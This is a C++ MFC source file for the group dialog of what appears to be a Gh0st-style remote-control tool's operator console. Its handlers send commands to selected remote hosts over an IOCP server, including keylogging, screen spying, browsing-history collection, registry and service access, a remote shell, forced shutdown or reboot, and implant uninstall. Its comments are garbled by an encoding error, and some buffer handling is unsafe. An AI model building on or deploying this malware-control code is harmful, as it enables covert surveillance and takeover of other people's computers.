// GroupDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "GroupDlg.h"
#include "MainFrm.h"
#include "InputDlg.h"
#include "InfoDlg.h"
#include "MsgBoxDlg.h"

CGroupDlg	*g_pGroupDlg;
extern CInfoDlg	*g_pInfoDlg;
extern CIOCPServer *m_iocpServer;
// CGroupDlg �Ի���

CGroupDlg::CGroupDlg(CWnd* pParent /*=NULL*/)
	: CXTPResizeDialog(CGroupDlg::IDD, pParent) {
	g_pGroupDlg = this;
}

void CGroupDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TREE_GROUP, m_tree_group);
}


BEGIN_MESSAGE_MAP(CGroupDlg, CXTPResizeDialog)
	ON_WM_PAINT()
	ON_WM_CTLCOLOR()
	ON_WM_WINDOWPOSCHANGED()
	ON_NOTIFY(NM_RCLICK, IDC_TREE_GROUP, &CGroupDlg::OnNMRClickTreeGroup)
	ON_NOTIFY(TVN_SELCHANGED, IDC_TREE_GROUP, &CGroupDlg::OnTvnSelchangedTreeGroup)
	ON_COMMAND(ID_TOOL_FILE, &CGroupDlg::OnToolFile)
	ON_COMMAND(ID_TOOL_PM, &CGroupDlg::OnToolPm)
	ON_COMMAND(ID_TOOL_SYSTEM, &CGroupDlg::OnToolSystem)
	ON_COMMAND(ID_TOOL_SERVICE, &CGroupDlg::OnToolService)
	ON_COMMAND(ID_TOOL_SYSINFO, &CGroupDlg::OnToolSysinfo)
	ON_COMMAND(ID_TOOL_KEYBOARD, &CGroupDlg::OnToolKeyboard)
	ON_COMMAND(ID_TOOL_REGEDIT, &CGroupDlg::OnToolRegedit)
	ON_COMMAND(ID_TOOL_REMOVE, &CGroupDlg::OnToolRemove)
	ON_COMMAND(ID_TOOL_CHANGEGROUP, &CGroupDlg::OnToolChangegroup)
	ON_COMMAND(ID_TOOL_RESTART, &CGroupDlg::OnToolRestart)
	ON_COMMAND(ID_TOOL_LOGOUT, &CGroupDlg::OnToolLogout)
	ON_COMMAND(ID_TOOL_SHUT, &CGroupDlg::OnToolShut)
	ON_COMMAND(ID_TOOL_SENDMSG, &CGroupDlg::OnToolSendmsg)
	ON_COMMAND(ID_TOOL_CHANGEREMARK, &CGroupDlg::OnToolChangeremark)
	ON_COMMAND(ID_TOOL_REMOTESHELL, &CGroupDlg::OnToolRemoteshell)
END_MESSAGE_MAP()


// CGroupDlg ��Ϣ�������
BOOL CGroupDlg::OnInitDialog()
{
	CXTPResizeDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetResize(IDC_TREE_GROUP,XTP_ANCHOR_TOPLEFT,    XTP_ANCHOR_BOTTOMRIGHT);

	if(!m_cImageList.Create(16,16,ILC_COLOR32|ILC_MASK,87*2,87*2) )
		return FALSE;

	CBitmap bmp;
	bmp.LoadBitmap(IDB_TREE_IMAGES);
	m_cImageList.Add(&bmp,RGB(255,255,255));
	m_tree_group.SetImageList(&m_cImageList, TVSIL_NORMAL);

	m_hMyComputer= m_tree_group.InsertItem(((CClientApp *)AfxGetApp())->m_CompanyName,0,0);
	m_hAutoComputer= m_tree_group.InsertItem(_T("Ĭ�Ϸ���(0)"),1,1,m_hMyComputer);

	m_tree_group.EnableMultiSelect();
	m_tree_group.SetItemBold(m_hMyComputer);
//	m_tree_group.SetItemColor(m_hMyComputer,RGB(255,20,147));
	// SetExplorerTheme not available in XTP 15.2
//	m_tree_group.SetTheme(xtpControlThemeOffice2016);
	m_tree_group.Expand(m_hMyComputer, TVE_EXPAND);
	m_tree_group.Expand(m_hAutoComputer, TVE_EXPAND);
	m_tree_group.SetFont(&XTPAuxData().font);
	// RefreshMetrics not available in XTP 15.2


	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CGroupDlg::SetOwnerPane(CXTPDockingPane* pPane)
{
	ASSERT(pPane);
	m_pPane = pPane;
}

void CGroupDlg::RefreshMetrics(XTPDockingPanePaintTheme nPaneTheme)
{
	m_brush.DeleteObject();

	XTPControlTheme nTheme = xtpControlThemeDefault;
	COLORREF clrBrush = ::GetSysColor(COLOR_3DFACE);

	switch(nPaneTheme)
	{
	case xtpPaneThemeOffice2007Word:
		clrBrush = XTPResourceImages()->GetImageColor(_T("DockingPane"), _T("WordPaneBackground"));
		nTheme = xtpControlThemeResource;
		break;
	case xtpPaneThemeVisualStudio2003: // System nTheme
		clrBrush = ::GetSysColor(COLOR_3DFACE);
		nTheme = xtpControlThemeOfficeXP;
		break;
	}

	theApp.m_csPane.RefreshMetrics(nPaneTheme);
	m_brush.CreateSolidBrush(clrBrush);

	SendMessageToDescendants(
		WM_XTP_SETCONTROLTHEME, nTheme);

	RedrawWindow(NULL ,NULL,
		RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN);
}

void CGroupDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO: �ڴ˴������Ϣ����������
	// ��Ϊ��ͼ��Ϣ���� CXTPResizeDialog::OnPaint()
	CXTPClientRect rWindow(this);
	theApp.m_csPane.DrawBorders(&dc, rWindow, m_pPane);
}

HBRUSH CGroupDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	CXTPResizeDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	return m_brush;
}

void CGroupDlg::OnWindowPosChanged(WINDOWPOS* lpwndpos)
{
	CXTPResizeDialog::OnWindowPosChanged(lpwndpos);

	// TODO: �ڴ˴������Ϣ����������
	// refresh borders.
	RedrawWindow(NULL ,NULL,
		RDW_INVALIDATE | RDW_UPDATENOW | RDW_ERASE | RDW_ALLCHILDREN);
}

// �Ҽ�����
CString strHost;
void CGroupDlg::OnNMRClickTreeGroup(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CPoint pt;
	CPoint ptSc ;//�һ��˵������Ͻǵ�λ���ǻ�����Ļ����ϵ  
	UINT  flag;
	GetCursorPos(&pt); //��ȡ��ǰ��������ȫ������ 
	ptSc =  pt;
	ScreenToClient(&pt);
	MapWindowPoints(&m_tree_group,&pt,1);//MapWindowPoint  Ϊ���ࣨCDialog���ĳ�Ա����,  ������ϵӳ��ΪCTreeCtrl������ϵ

	HTREEITEM hItem  = m_tree_group.HitTest(pt,&flag) ;
	if(NULL != hItem)
	{
		m_tree_group.Select(hItem,TVGN_CARET);//���õ���ڵ�Ϊ��ǰѡ�нڵ�
		strHost.Format(_T("%s"),m_tree_group.GetItemText(hItem));
		if (!m_tree_group.ItemHasChildren(hItem)&&strHost.Find(_T("Ĭ�Ϸ���"))==-1)// �����·���
		{
			CMenu m,*mn;
			m.LoadMenu(IDR_MENU_TOOL);//���ز˵���Դ
			mn = m.GetSubMenu(0);//��ȡ�˵�����
			mn->TrackPopupMenu(TPM_LEFTALIGN,ptSc.x,ptSc.y,this); //��ʾ�˵�
		}
	}

	*pResult = 0;
}


// �������
void CGroupDlg::OnTvnSelchangedTreeGroup(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if(pNMTreeView->itemNew.hItem!=pNMTreeView->itemOld.hItem)
	{
		// ������
		CString strText = m_tree_group.GetItemText(pNMTreeView->itemNew.hItem);
		if (!m_tree_group.ItemHasChildren(pNMTreeView->itemNew.hItem)&&strText.Find(_T("Ĭ�Ϸ���"))==-1)// �����·���
		{
			if ( m_tree_group.GetSelectedCount() == 0 )//�޸�releaseģʽ�µ������鵯��encountered an improper argument
				return;

			CString strmem,strcpu,stros,strip,struser;
			for(int i=0;i<g_pInfoDlg->m_list_info.GetItemCount();i++)
			{
				if (m_tree_group.GetItemData(pNMTreeView->itemNew.hItem) == g_pInfoDlg->m_list_info.GetItemData(i))
				{
					strmem  = g_pInfoDlg->m_list_info.GetItemText(i,4);
					struser = g_pInfoDlg->m_list_info.GetItemText(i,3);
					strcpu  = g_pInfoDlg->m_list_info.GetItemText(i,5);
					strip   = g_pInfoDlg->m_list_info.GetItemText(i,1);
					stros   = g_pInfoDlg->m_list_info.GetItemText(i,7);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_OS2,stros);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_USER2,struser);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_CPU2,strcpu);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_IP2,strip);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_MEM2,strmem);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_HOST,strText);
					g_pInfoDlg->SetDlgItemText(IDC_STATIC_NAME2,strText);
				}
			}
		}
	}
	*pResult = 0;
}


void CGroupDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{     
	if ( m_tree_group.GetSelectedCount() == 0 )
		return;

	HTREEITEM hGroupItem = m_tree_group.GetRootItem();
	hGroupItem = m_tree_group.GetChildItem(hGroupItem);
	HTREEITEM hChildItem = NULL;
	while(hGroupItem)//����������
	{
		if (m_tree_group.ItemHasChildren(hGroupItem))//��Դ��������ķ�����в���
		{
			hChildItem = m_tree_group.GetChildItem(hGroupItem);
			while(hChildItem)//������������
			{
				if (m_tree_group.GetItemState(hChildItem, TVIS_SELECTED)&&!m_tree_group.ItemHasChildren(hChildItem))//���ѡ��״̬
				{
					ClientContext* pContext = (ClientContext*)m_tree_group.GetItemData(hChildItem);
					m_iocpServer->Send(pContext, pData, nSize);//���������������
				}
				hChildItem = m_tree_group.GetNextSiblingItem(hChildItem);//������һ����
			}

			hGroupItem = m_tree_group.GetNextSiblingItem(hGroupItem);//������һ����
		}
		else//�����ڲ���������
		{
			hGroupItem =m_tree_group.GetNextSiblingItem(hGroupItem);//������һ����
		}		
	}	

}

void CGroupDlg::OnToolFile()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolPm()
{
	// TODO: �ڴ���������������
 	BYTE	bToken = COMMAND_SCREEN_SPY;
  SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolSystem()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolService()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_SERVICE_MANAGER;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolSysinfo()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_URL_HISTORY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolKeyboard()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_KEYBOARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolRegedit()
{
	// TODO: �ڴ���������������
	BYTE	bToken = COMMAND_REGEDIT;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGroupDlg::OnToolRemove()
{
	// TODO: �ڴ���������������
		MessageBox(_T("Multi-select operation is not supported"), _T("Notice"), MB_ICONWARNING);
		return;

	BYTE bToken = COMMAND_UNINSTALL;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
}



HTREEITEM  CGroupDlg::AddToGroup(CString strGroup)//�����ν����ӷ��飬�����ؾ�������Ϊ��ӵķ����������ܴ����ţ�
{
	HTREEITEM hRootItem = m_tree_group.GetRootItem();
	HTREEITEM hItem = m_tree_group.GetChildItem(hRootItem);

	if(hItem == NULL)//��û���κ���������
	{
		hItem = m_tree_group.InsertItem(strGroup,hRootItem);//д�����
		m_tree_group.SetItemData(hItem, 0x1);               //������������λ���պÿ��Լ�¼����������������ʼ��Ϊ1
		m_tree_group.SetItemImage(hItem,1,1);               //����ͼ��
		m_nCount++;                                         //����������1

	}else 
	{
		while(hItem != NULL) 
		{
			CString strTitle = m_tree_group.GetItemText(hItem);//�����οؼ���ȡ������
			int i = strTitle.Find("(");
			strTitle = strTitle.Left(i);
			if(strTitle == strGroup)
			{				
				m_tree_group.SetItemData(hItem,m_tree_group.GetItemData(hItem)+1);//��������������1				
				break;
			}
			hItem = m_tree_group.GetNextItem(hItem,TVGN_NEXT); //����ͬ�ȼ��ӽ��
		}
		if(hItem == NULL)                                      //�����������������δ�ҵ�
		{
			hItem = m_tree_group.InsertItem(strGroup,hRootItem);//д���·���
			m_tree_group.SetItemData(hItem, 0x1);               //������������λ���պÿ��Լ�¼����������������ʼ��Ϊ1
			m_tree_group.SetItemImage(hItem,1,1);               //����ͼ��
			m_nCount++;                                         //����������1		
		}
	}
	//���÷�����
	strGroup.Format(_T("%s(%d)"), strGroup , m_tree_group.GetItemData(hItem));
	m_tree_group.SetItemText(hItem, strGroup);

	//չ������
	m_tree_group.Expand(hItem,TVE_EXPAND); 

	return hItem;
}

//���ķ���
void CGroupDlg::OnToolChangegroup()
{
	// TODO: �ڴ���������������
	if ( m_tree_group.GetSelectedCount() == 0 )//û��ѡ������ֱ�ӷ���
		return;

	HTREEITEM hItem = m_tree_group.GetSelectedItem();

	CString str,strGroup;
	CInputDialog dlg;

	if (m_tree_group.GetSelectedCount() == 1)//ѡ��һ������
	{		
		str.Format(_T("Host(%s) group"), m_tree_group.GetItemText(hItem));
		strGroup = m_tree_group.GetItemText(m_tree_group.GetParentItem(hItem));
		int i = strGroup.Find(_T("("));
		strGroup = strGroup.Left(i);
		dlg.m_str.Format(_T("%s"), strGroup);//ȡ��������ֵ�������޸�
	}
	else{
		MessageBox(_T("Multi-select operation is not supported"), _T("Notice"), MB_ICONWARNING);
		return;
	}

	dlg.Init(str, _T("Enter new group name:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;

	strGroup  = dlg.m_str; //�µķ�����

	HTREEITEM hParent = g_pGroupDlg->m_tree_group.GetParentItem(hItem);
	CString strTitle = m_tree_group.GetItemText(hParent);//�����οؼ���ȡ������
	int i = strTitle.Find(_T("("));
	strTitle = strTitle.Left(i);

	if (strcmp(strTitle,strGroup) ==0)
	{
		MessageBox(_T("Already in this group"), _T("Notice"), MB_ICONWARNING);
		return;
	}

	int		nPacketLength =  strGroup.GetLength()  + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_CHANGE_GROUP;
	memcpy(lpPacket + 1, strGroup, nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength); //��������
	delete[] lpPacket;

	//д���µķ��飬����������
	HTREEITEM  hGroup = AddToGroup(dlg.m_str);

	//���·���д��������,�������½��ľ��
	HTREEITEM  hChild = m_tree_group.InsertItem(m_tree_group.GetItemText(hItem),2,2,hGroup);

	//���½����д��������
	m_tree_group.SetItemData(hChild, m_tree_group.GetItemData(hItem));  

	//ɾ��ԭ����������
	m_tree_group.DeleteItem(hItem); //ɾ������
	m_tree_group.SetItemData(hParent, m_tree_group.GetItemData(hParent)-1);//��д��������������

	if(m_tree_group.GetItemData(hParent) == 0&& strTitle.Find(_T("Ĭ�Ϸ���"))==-1)//���������������ɾ��
	{
		m_tree_group.DeleteItem(hParent);  //ɾ������
		m_nCount -= 1;                     //����������1
	}
	else
	{
		//���÷�����ʾ
		strTitle.Format(_T("%s(%d)"),strTitle ,m_tree_group.GetItemData(hParent));  //����������������������
		m_tree_group.SetItemText( hParent, strTitle);//���÷�����Ϣ
	}
}

//���ı�ע
void CGroupDlg::OnToolChangeremark()
{
	// TODO: �ڴ���������������
	HTREEITEM hItem = m_tree_group.GetSelectedItem();

	CString str;
	CInputDialog dlg;

	if (m_tree_group.GetSelectedCount() == 1)//ѡ��һ������
	{		
		str.Format(_T("Host(%s) group"), m_tree_group.GetItemText(hItem));
	}
	else{
		MessageBox(_T("Multi-select operation is not supported"), _T("Notice"), MB_ICONWARNING);
		return;
	}

	dlg.Init(str, _T("Enter new remark:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;

	int		nPacketLength =  dlg.m_str.GetLength()  + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str, nPacketLength - 1);
	SendSelectCommand(lpPacket, nPacketLength); //��������
	delete[] lpPacket;

	m_tree_group.SetItemText(hItem,dlg.m_str);

}



void CGroupDlg::OnToolRestart()
{
	// TODO: �ڴ���������������
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
//	LocalFree((LPBYTE)&bToken);
}

void CGroupDlg::OnToolLogout()
{
	// TODO: �ڴ���������������
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
//	LocalFree((LPBYTE)&bToken);
}

void CGroupDlg::OnToolShut()
{
	// TODO: �ڴ���������������
	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));	
//	LocalFree((LPBYTE)&bToken);
}

struct MSGBOX
{
	CHAR Title[200];
	CHAR szText[1000];
	UINT Type;
}MsgBox;

void CGroupDlg::OnToolSendmsg()
{
	// TODO: �ڴ���������������
	CMsgBoxDlg dlg;
SHOW:
	if(dlg.DoModal() != IDOK) 
		return;

	if (strlen(dlg.m_edit_caption)<1 || strlen(dlg.m_edit_text) < 1)
	{
		MessageBox(_T("Please enter title and content"), _T("Notice"), MB_OK | MB_ICONWARNING);
		goto SHOW;
	}

	ZeroMemory(&MsgBox,sizeof(MSGBOX));
	strcpy(MsgBox.Title,dlg.m_edit_caption.GetBuffer(0));
	strcpy(MsgBox.szText,dlg.m_edit_text.GetBuffer(0));
	MsgBox.Type = dlg.m_msgButton|dlg.m_msgIcon;

	BYTE	*bToken = new BYTE[sizeof(MSGBOX)+1];
	bToken[0]= COMMAND_MESSAGEBOX;
	memcpy(&bToken[1],&MsgBox,sizeof(MSGBOX));

	SendSelectCommand(bToken, sizeof(MSGBOX)+1);
	delete bToken;
	goto SHOW;
}




void CGroupDlg::OnToolRemoteshell()
{
	// TODO:  �ڴ���������������
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
